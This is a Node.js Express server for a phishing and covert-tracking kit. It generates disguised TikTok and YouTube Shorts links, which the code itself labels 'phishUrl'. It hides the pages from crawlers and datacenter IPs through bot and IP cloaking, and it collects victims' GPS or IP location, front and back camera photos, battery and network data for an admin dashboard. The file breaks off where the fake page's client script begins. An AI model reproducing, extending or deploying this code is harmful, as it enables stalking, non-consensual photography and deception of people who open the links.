// language: JavaScript, file: server.js, runtime: Node 18+
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '25mb' }));
app.use(cookieParser());

const PORT = process.env.PORT || 12044;
const HOST = '0.0.0.0';

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 8 * 3600 * 1000;

// === RATE LIMIT CONFIG ===
const LOGIN_WINDOW_MS = 15 * 60 * 1000;
const LOGIN_MAX = 5;
const COLLECT_WINDOW_MS = 60 * 1000;
const COLLECT_MAX = 10;
const loginAttempts = new Map();
const collectAttempts = new Map();

function rateLimit(map, key, windowMs, max) {
  const now = Date.now();
  const rec = map.get(key) || { count: 0, reset: now + windowMs };
  if (now > rec.reset) { rec.count = 0; rec.reset = now + windowMs; }
  if (rec.count >= max) return { allowed: false, retry: Math.ceil((rec.reset - now) / 1000) };
  rec.count++;
  map.set(key, rec);
  return { allowed: true };
}

function getClientIp(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
}

const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.jsonl');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');

console.log('[boot] ADMIN_USER=' + (ADMIN_USER === 'admin' ? '(default)' : '(custom)'));
console.log('[boot] IMGBB REMOVED — Using Direct Proxy');

function signToken(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  return body + '.' + sig;
}
function verifyToken(token) {
  if (!token || typeof token !== 'string') return null;
  const [body, sig] = token.split('.');
  if (!body || !sig) return null;
  const expect = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  const a = Buffer.from(sig);
  const b = Buffer.from(expect);
  if (a.length !== b.length) return null;
  if (!crypto.timingSafeEqual(a, b)) return null;
  try {
    const payload = JSON.parse(Buffer.from(body, 'base64url').toString());
    if (payload.exp && Date.now() > payload.exp) return null;
    return payload;
  } catch { return null; }
}
function setSession(res, user) {
  const token = signToken({ user, exp: Date.now() + SESSION_MAX_AGE });
  res.cookie('ct_session', token, {
    httpOnly: true,
    sameSite: 'lax',
    secure: process.env.NODE_ENV === 'production',
    maxAge: SESSION_MAX_AGE,
    path: '/'
  });
}
function requireAuth(req, res, next) {
  const p = verifyToken(req.cookies?.ct_session);
  if (!p) {
    if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'unauthorized' });
    return res.redirect('/login');
  }
  req.user = p.user;
  next();
}

function readLinks() { try { return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8')); } catch { return {}; } }
function saveLinks(o) { fs.writeFileSync(LINKS_FILE, JSON.stringify(o, null, 2)); }
function appendCapture(e) { fs.appendFileSync(CAPTURES_FILE, JSON.stringify(e) + '\n'); }
function readCaptures() {
  try {
    return fs.readFileSync(CAPTURES_FILE, 'utf8').trim().split('\n').filter(Boolean)
      .map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
  } catch { return []; }
}
function writeCaptures(arr) {
  fs.writeFileSync(CAPTURES_FILE, arr.map(c => JSON.stringify(c)).join('\n') + (arr.length ? '\n' : ''));
}
function saveDataUrl(dataUrl, filename) {
  if (!dataUrl || typeof dataUrl !== 'string') return null;
  const m = dataUrl.match(/^data:image\/(jpeg|jpg|png|webp);base64,(.+)$/i);
  if (!m) return null;
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 6 * 1024 * 1024) return null;
  fs.writeFileSync(path.join(UPLOAD_DIR, filename), buf);
  return '/data/uploads/' + filename;
}
function deleteFileIfExists(p) {
  if (!p || typeof p !== 'string') return;
  if (!p.startsWith('/data/uploads/')) return;
  const f = path.join(__dirname, p.replace(/^\//, ''));
  try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch {}
}

const CLOUD_IP_REGEX = /^(3\.|13\.|15\.|18\.|34\.|35\.|52\.|54\.|104\.(1[6-9]|2[0-9]|3[0-1])\.|35\.|107\.|108\.|136\.|142\.|146\.|147\.|148\.|149\.|150\.|151\.|152\.|153\.|154\.|155\.|156\.|157\.|158\.|159\.|160\.|161\.|162\.|163\.|164\.|165\.|166\.|167\.|168\.|169\.|170\.|171\.|172\.|173\.|174\.|175\.|176\.|177\.|178\.|179\.|180\.|181\.|182\.|183\.|184\.|185\.|186\.|187\.|188\.|189\.|190\.|191\.|192\.|193\.|194\.|195\.|196\.|197\.|198\.|199\.|200\.|201\.|202\.|203\.|204\.|205\.|206\.|207\.|208\.|209\.|210\.|211\.|212\.|213\.|214\.|215\.|216\.|217\.|218\.|219\.|220\.|221\.|222\.|223\.)/;
function isDatacenterIP(ip) {
  if (!ip || ip === 'unknown') return false;
  if (ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) return false;
  return CLOUD_IP_REGEX.test(ip) || ip.includes('34.') || ip.includes('35.') || ip.includes('104.');
}

const HARD_BOT = /(googlebot|bingbot|yandexbot|duckduckbot|baiduspider|slurp|curl|wget|python-requests|axios\/|go-http-client|java\/|okhttp|bingpreview|ahrefsbot|semrushbot|mj12bot|dotbot|petalbot|applebot|gptbot|claudebot|perplexitybot|ccbot|bytespider)/i;
const PREVIEW_BOT = /(facebookexternalhit|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|embedly|skypeuripreview)/i;
function detectBot(ua) {
  if (!ua) return 'hard';
  if (HARD_BOT.test(ua)) return 'hard';
  if (PREVIEW_BOT.test(ua)) return 'preview';
  return 'human';
}

async function fetchOEmbed(url) {
  try {
    const r = await fetch('https://www.tiktok.com/oembed?url=' + encodeURIComponent(url), {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const d = await r.json();
    if (!d.thumbnail_url) return null;
    return { thumb: d.thumbnail_url, user: d.author_name || '', avatar: d.author_url || '', caption: d.title || '', desc: '', platform: 'tiktok' };
  } catch { return null; }
}
async function fetchTikWM(url) {
  try {
    const r = await fetch('https://www.tikwm.com/api/?url=' + encodeURIComponent(url), {
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const j = await r.json();
    if (!j || j.code !== 0 || !j.data) return null;
    return {
      thumb: j.data.cover || j.data.origin_cover || '',
      user: j.data.author?.unique_id || 'user',
      avatar: j.data.author?.avatar || '',
      caption: j.data.title || 'TikTok Video',
      desc: j.data.title || '',
      platform: 'tiktok'
    };
  } catch { return null; }
}
async function fetchYouTube(url) {
  try {
    const matchVideo = url.match(/(?:youtu\.be\/|youtube\.com\/(?:shorts\/|watch\?v=|embed\/|v\/))([\w-]{11})/);

    if (matchVideo) {
      const videoId = matchVideo[1];

      const r = await fetch('https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=' + videoId + '&format=json', {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const d = await r.json();

      const thumbCandidates = [
        'https://img.youtube.com/vi/' + videoId + '/maxresdefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/sddefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/hqdefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/mqdefault.jpg'
      ];
      let thumb = thumbCandidates[thumbCandidates.length - 1];
      for (const candidate of thumbCandidates) {
        try {
          const headRes = await fetch(candidate, { method: 'HEAD', signal: AbortSignal.timeout(4000) });
          if (headRes.ok) { thumb = candidate; break; }
        } catch (e) {}
      }

      let user = d.author_name || 'YouTube';
      let avatar = d.author_url || '';
      if (d.author_url) {
        const handleMatch = d.author_url.match(/youtube\.com\/@([\w.\-]+)/i);
        if (handleMatch) user = '@' + handleMatch[1];
      }

      let caption = d.title || 'YouTube Video';
      caption = caption.replace(/\s*-\s*YouTube\s*$/i, '').trim();

      let desc = '';
      try {
        const pageRes = await fetch('https://www.youtube.com/watch?v=' + videoId + '&hl=id', {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8'
          },
          signal: AbortSignal.timeout(8000)
        });
        if (pageRes.ok) {
          const html = await pageRes.text();
          const descMatch = html.match(/"shortDescription":"((?:[^"\\]|\\.)*)"/);
          if (descMatch) {
            desc = descMatch[1]
              .replace(/\\n/g, '\n')
              .replace(/\\"/g, '"')
              .replace(/\\\//g, '/')
              .replace(/\\u([0-9a-fA-F]{4})/g, (_, grp) => String.fromCharCode(parseInt(grp, 16)));
            try { desc = decodeURIComponent(escape(desc)); } catch (e) {}
            if (desc.length > 280) desc = desc.substring(0, 277) + '...';
          }

          const avatarMatch = html.match(/"avatar":{"thumbnails":\[\{"url":"([^"]+)"/);
          if (avatarMatch) avatar = avatarMatch[1];
        }
      } catch (e) {}

      return { thumb, user, avatar, caption, desc: desc || caption, platform: 'youtube' };
    }

    if (/youtube\.com\/(@|channel\/|c\/)/i.test(url)) {
      const r = await fetch(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept-Language': 'id-ID,id;q=0.9'
        },
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const html = await r.text();

      const thumbMatch = html.match(/<meta\s+property="og:image"\s+content="([^"]+)"/i);
      const titleMatch = html.match(/<meta\s+property="og:title"\s+content="([^"]+)"/i);
      const descMatch = html.match(/<meta\s+property="og:description"\s+content="([^"]+)"/i);

      let thumb = thumbMatch ? thumbMatch[1].replace(/&amp;/g, '&') : '';
      let caption = titleMatch ? titleMatch[1].replace(/&amp;/g, '&') : 'YouTube Channel';
      let desc = descMatch ? descMatch[1].replace(/&amp;/g, '&') : '';

      let user = 'Channel';
      let avatar = '';
      const handleMatch = url.match(/youtube\.com\/@([\w.\-]+)/i);
      if (handleMatch) user = '@' + handleMatch[1];

      if (thumb) return { thumb, user, avatar, caption, desc: desc || caption, platform: 'youtube' };
    }
    return null;
  } catch { return null; }
}

async function lookupIp(ip) {
  try {
    const r = await fetch('https://ipwho.is/' + encodeURIComponent(ip), { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.success && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipwho.is' };
    }
  } catch {}
  try {
    const r = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', {
      headers: { 'User-Agent': 'curl/8.0' },
      signal: AbortSignal.timeout(5000)
    });
    const d = await r.json();
    if (d && !d.error && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipapi.co' };
    }
  } catch {}
  try {
    const r = await fetch('http://ip-api.com/json/' + encodeURIComponent(ip) + '?fields=status,lat,lon,city', { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.status === 'success') {
      return { lat: d.lat, lng: d.lon, acc: 5000, city: d.city || '', provider: 'ip-api.com' };
    }
  } catch {}
  return null;
}

app.post('/api/login', (req, res) => {
  const ip = getClientIp(req);
  const rl = rateLimit(loginAttempts, ip, LOGIN_WINDOW_MS, LOGIN_MAX);
  if (!rl.allowed) return res.status(429).json({ error: 'Terlalu banyak percobaan. Coba lagi dalam ' + rl.retry + ' detik.' });
  const { user, pass } = req.body || {};
  if (user !== ADMIN_USER || pass !== ADMIN_PASS) return res.status(401).json({ error: 'Username/Password salah' });
  loginAttempts.delete(ip);
  setSession(res, user);
  res.json({ ok: true });
});

app.post('/api/logout', (req, res) => {
  res.clearCookie('ct_session', { path: '/' });
  res.json({ ok: true });
});

app.get('/api/me', requireAuth, (req, res) => res.json({ ok: true, user: req.user }));

app.get('/api/links', requireAuth, (req, res) => {
  const links = readLinks();
  const list = Object.keys(links).map(id => ({ id, ...links[id] }));
  list.sort((a, b) => new Date(b.created) - new Date(a.created));
  res.json(list);
});

app.delete('/api/links', requireAuth, (req, res) => {
  try {
    saveLinks({});
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const links = readLinks();
  if (links[req.params.id]) {
    delete links[req.params.id];
    saveLinks(links);
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'Link tidak ditemukan' });
  }
});

app.post('/api/link', requireAuth, async (req, res) => {
  try {
    let { tiktokUrl, customTitle, customDesc } = req.body || {};
    if (!tiktokUrl) return res.status(400).json({ error: 'URL tidak boleh kosong' });

    const isYT = /youtu(be\.com|\.be)/i.test(tiktokUrl);
    const isTT = /tiktok\.com/i.test(tiktokUrl);

    if (!isYT && !isTT) {
      return res.status(400).json({ error: 'Hanya mendukung URL TikTok dan YouTube' });
    }

    const cleanUrl = tiktokUrl.split('?')[0];
    let meta = null;

    if (isTT) {
      meta = await fetchOEmbed(cleanUrl);
      if (!meta) meta = await fetchTikWM(cleanUrl);
    } else if (isYT) {
      meta = await fetchYouTube(cleanUrl);
    }

    if (!meta) meta = { thumb: '', user: 'user', avatar: '', caption: 'Video', desc: 'Video', platform: isYT ? 'youtube' : 'tiktok' };

    meta.thumbDisplay = meta.thumb || '';
    
    if (customTitle) meta.ogTitle = String(customTitle).slice(0, 100);
    if (customDesc) meta.ogDesc = String(customDesc).slice(0, 200);

    const id = crypto.randomBytes(4).toString('hex');
    const links = readLinks();
    links[id] = {
      tiktokUrl: cleanUrl,
      meta,
      created: new Date().toISOString(),
      hits: 0
    };
    saveLinks(links);

    const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0];
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const origin = proto + '://' + host;

    const cacheBuster = '?v=' + Math.random().toString(36).substring(2, 7);
    const finalUrl = origin + '/v/' + id + cacheBuster;

    res.json({ ok: true, phishUrl: finalUrl, meta });
  } catch (err) {
    console.error('[api/link error]', err);
    res.status(500).json({ error: 'Gagal memproses link: ' + err.message });
  }
});

app.post('/api/collect', async (req, res) => {
  try {
    const ip = getClientIp(req);

    const rl = rateLimit(collectAttempts, ip, COLLECT_WINDOW_MS, COLLECT_MAX);
    if (!rl.allowed) return res.status(429).json({ error: 'rate limited', retry: rl.retry });

    const token = req.headers['x-collect-token'] || req.body.collect_token;
    const payload = verifyToken(token);
    if (!payload || !payload.linkId || !payload.exp || Date.now() > payload.exp) {
      return res.status(401).json({ error: 'invalid token' });
    }
    const linksCheck = readLinks();
    if (!linksCheck[payload.linkId]) {
      return res.status(401).json({ error: 'link not found' });
    }

    const remoteIp = req.socket.remoteAddress || '';

    let loc = req.body.loc;
    if (typeof loc === 'string') {
      try { loc = JSON.parse(loc); } catch(e) { loc = null; }
    }

    let locType = 'GPS';

    if (!loc || loc.lat === undefined || loc.lng === undefined || isNaN(Number(loc.lat)) || isNaN(Number(loc.lng))) {
      loc = null;
      locType = 'IP';
      const lookup = await lookupIp(ip);
      if (lookup) loc = lookup;
    } else {
      loc = { lat: Number(loc.lat), lng: Number(loc.lng), acc: Number(loc.acc) || 0 };
    }

    const capId = (req.body.id && String(req.body.id).replace(/[^a-z0-9\-]/gi, '').slice(0, 24)) || crypto.randomBytes(6).toString('hex');
    const ts = Date.now();
    const frontPath = saveDataUrl(req.body.photo_front, capId + '_front.jpg');
    const backPath = saveDataUrl(req.body.photo_back, capId + '_back.jpg');

    appendCapture({
      id: capId,
      ts,
      ip,
      remoteIp,
      loc,
      locType,
      battery: req.body.battery || null,
      network: req.body.network || null,
      ua: req.body.ua || '',
      photo_front: frontPath,
      photo_back: backPath
    });
    res.json({ ok: true });
  } catch (err) {
    console.error('[api/collect error]', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/captures', requireAuth, (req, res) => res.json(readCaptures()));

app.delete('/api/captures/:id', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    const target = all.find(c => c.id === req.params.id);
    if (target) { deleteFileIfExists(target.photo_front); deleteFileIfExists(target.photo_back); }
    writeCaptures(all.filter(c => c.id !== req.params.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/captures', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    for (const c of all) { deleteFileIfExists(c.photo_front); deleteFileIfExists(c.photo_back); }
    writeCaptures([]);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PROXY GAMBAR (PENGGANTI IMGBB)
app.get('/thumb/:id', async (req, res) => {
  try {
    const links = readLinks();
    const l = links[req.params.id];
    if (!l || !l.meta) return res.status(404).end();

    const url = l.meta.thumb;
    if (!url) return res.status(404).end();

    const reqHeaders = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8'
    };
    if (/tiktokcdn|tiktok\.com/i.test(url)) reqHeaders['Referer'] = 'https://www.tiktok.com/';

    const r = await fetch(url, { headers: reqHeaders, signal: AbortSignal.timeout(8000) });
    if (!r.ok) return res.status(404).end();

    res.setHeader('Content-Type', r.headers.get('content-type') || 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    const buf = Buffer.from(await r.arrayBuffer());
    res.send(buf);
  } catch (e) {
    res.status(404).end();
  }
});

app.get('/v/:id', (req, res) => {
  const links = readLinks();
  const l = links[req.params.id];
  if (!l) return res.status(404).send('Link tidak valid');

  const clientIp = getClientIp(req);
  if (isDatacenterIP(clientIp)) {
    console.log('[cloak] Blocked datacenter IP:', clientIp);
    return res.status(404).type('html').send('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding:50px;background:#000;color:#fff;"><h1>404</h1><p>Halaman tidak ditemukan.</p></body></html>');
  }

  const bot = detectBot(req.headers['user-agent'] || '');

  if (bot === 'hard') {
    return res.status(404).type('html').send('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding:50px;background:#000;color:#fff;"><h1>404</h1><p>Halaman tidak ditemukan.</p></body></html>');
  }

  l.hits = (l.hits || 0) + 1;
  saveLinks(links);

  const m = l.meta || {};
  const thumb = '/thumb/' + req.params.id;
  
  const targetUrl = l.tiktokUrl;
  const isYT = m.platform === 'youtube';
  
  const logoUrl = isYT ? 'https://www.youtube.com/favicon.ico' : 'https://www.tiktok.com/favicon.ico';
  const siteName = isYT ? 'YouTube' : 'TikTok';
  const siteUrl = isYT ? 'https://youtube.com' : 'https://www.tiktok.com/';

  if (bot === 'preview') {
    const esc = s => String(s || '').replace(/[<>&"']/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[c]));
    const finalTitle = m.ogTitle || m.caption || 'Video';
    const finalDesc = m.ogDesc || m.desc || m.caption || 'Video';

    const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0];
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const proxyThumb = proto + '://' + host + '/thumb/' + req.params.id;

    return res.status(200).type('html').send(`<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title>${esc(finalTitle)}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<meta property="og:type" content="video.other">
<meta property="og:site_name" content="${siteName}">
<meta property="og:url" content="${siteUrl}">
<meta property="og:title" content="${esc(finalTitle)}">
<meta property="og:description" content="${esc(finalDesc)}">
<meta property="og:image" content="${proxyThumb}">
<meta property="og:image:secure_url" content="${proxyThumb}">
<meta property="og:image:width" content="720">
<meta property="og:image:height" content="1280">
<meta property="og:image:type" content="image/jpeg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${esc(finalTitle)}">
<meta name="twitter:description" content="${esc(finalDesc)}">
<meta name="twitter:image" content="${proxyThumb}">
</head><body></body></html>`);
  }

  const collectToken = signToken({ linkId: req.params.id, exp: Date.now() + 3600_000 });

  const escAttr = s => String(s || '').replace(/[<>"'&]/g, c => ({ '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;' }[c]));
  const escJson = s => JSON.stringify(s || '').replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');

  let html = '';

  if (isYT) {
    // === LAYOUT YOUTUBE SHORTS ===
    html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<title>${escAttr(m.caption || 'Video')}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{height:100vh;background:#0f0f0f;color:#fff;font-family:Roboto,Arial,sans-serif;display:flex;flex-direction:column;overflow:hidden;user-select:none}
  
  .tap-overlay { position: absolute; inset: 0; z-index: 50; cursor: pointer; }

  .yt-header { position: absolute; top: 0; left: 0; width: 100%; padding: 15px; z-index: 20; display: flex; flex-direction: column; gap: 10px; background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%); }
  .yt-header-top { display: flex; align-items: center; justify-content: space-between; }
  .yt-logo { height: 24px; }
  .yt-header-icons { display: flex; gap: 15px; align-items: center; }
  .yt-header-icons svg { width: 22px; height: 22px; fill: #fff; }
  
  .yt-sound-btn { position: absolute; top: 65px; left: 15px; background: #fff; color: #0f0f0f; padding: 8px 12px; border-radius: 4px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 8px; z-index: 20; }
  .yt-sound-btn svg { width: 16px; height: 16px; fill: #0f0f0f; }

  .player-wrap{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#000;}
  .thumb-img{width:100%;height:100%;object-fit:cover;}
  
  .play-btn{position:absolute;z-index:5;width:70px;height:70px;background:rgba(255,255,255,0.2);backdrop-filter:blur(5px);border-radius:50%;display:flex;align-items:center;justify-content:center;}
  .play-btn svg{width:35px;height:35px;fill:#fff;margin-left:5px}
  .loading-state{display:none;width:35px;height:35px;border:4px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;}
  @keyframes spin{to{transform:rotate(360deg)}}

  .sidebar{position:absolute;right:10px;bottom:120px;display:flex;flex-direction:column;gap:20px;z-index:10;align-items:center;}
  .icon-box { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .icon{width:40px;height:40px;border-radius:50%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;}
  .icon svg{width:24px;height:24px;fill:#fff}
  .icon-box span { font-size: 11px; font-weight: 500; color: #fff; text-shadow: 0 1px 2px #000; }
  
  .bottom-info { position: absolute; bottom: 0; left: 0; width: 100%; padding: 15px; z-index: 10; background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 100%); pointer-events: none; display: flex; flex-direction: column; gap: 10px; }
  .channel-row { display: flex; align-items: center; gap: 10px; }
  .channel-avatar { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
  .channel-name { font-size: 14px; font-weight: 500; color: #fff; }
  .btn-subscribe { background: #fff; color: #0f0f0f; padding: 6px 12px; border-radius: 18px; font-size: 12px; font-weight: 600; margin-left: 5px; }
  .video-title { font-size: 13px; color: #eee; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; padding-bottom: 5px; }
  .yt-progress { position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background: rgba(255,255,255,0.2); z-index: 10; }
  .yt-progress .bar { width: 15%; height: 100%; background: #ff0000; }
</style>
</head><body>

<div class="tap-overlay" id="tap-overlay"></div>

<div class="yt-header">
  <div class="yt-header-top">
    <svg class="yt-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 90 20" fill="#fff"><path d="M27.97 3.123A3.5 3.5 0 0 0 25.5.65C23.3.06 12 .06 12 .06S.7.06-1.5.65A3.5 3.5 0 0 0-3.97 3.12C-4.56 5.3-4.56 10-4.56 10s0 4.7.59 6.88a3.5 3.5 0 0 0 2.47 2.47c2.2.59 13.5.59 13.5.59s11.3 0 13.5-.59a3.5 3.5 0 0 0 2.47-2.47c.59-2.18.59-6.88.59-6.88s0-4.7-.59-6.88zM8.2 13.8V6.2l7.3 3.8-7.3 3.8z" transform="translate(5)"/><text x="32" y="14.5" font-family="Arial, sans-serif" font-weight="bold" font-size="14">YouTube</text></svg>
    <div class="yt-header-icons">
      <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
      <svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
    </div>
  </div>
</div>

<div class="yt-sound-btn">
  <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
  AKTIFKAN SUARA
</div>

<div class="player-wrap">
  <img class="thumb-img" src="${thumb}" onerror="this.style.display='none'">
  
  <div class="play-btn" id="playBtn">
    <svg id="playIcon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    <div class="loading-state" id="spinner"></div>
  </div>

  <div class="sidebar">
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></div>
      <span>8,3 rb</span>
    </div>
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg></div>
      <span>34</span>
    </div>
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg></div>
      <span>Bagikan</span>
    </div>
  </div>

  <div class="bottom-info">
    <div class="channel-row">
      <img class="channel-avatar" src="${m.avatar || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld2JveD0iMCAwIDM1IDM1Ij48Y2lyY2xlIGN4PSIxNy41IiBjeT0iMTcuNSIgcj0iMTcuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE3LjUiIHk9IjIyIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg=='}" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld2JveD0iMCAwIDM1IDM1Ij48Y2lyY2xlIGN4PSIxNy41IiBjeT0iMTcuNSIgcj0iMTcuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE3LjUiIHk9IjIyIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg=='">
      <span class="channel-name">${escAttr(m.user || 'Channel')}</span>
      <div class="btn-subscribe">Subscribe</div>
    </div>
    <div class="video-title">${escAttr(m.caption || 'Video')}</div>
  </div>

  <div class="yt-progress"><div class="bar"></div></div>
</div>

<script>
(function(){
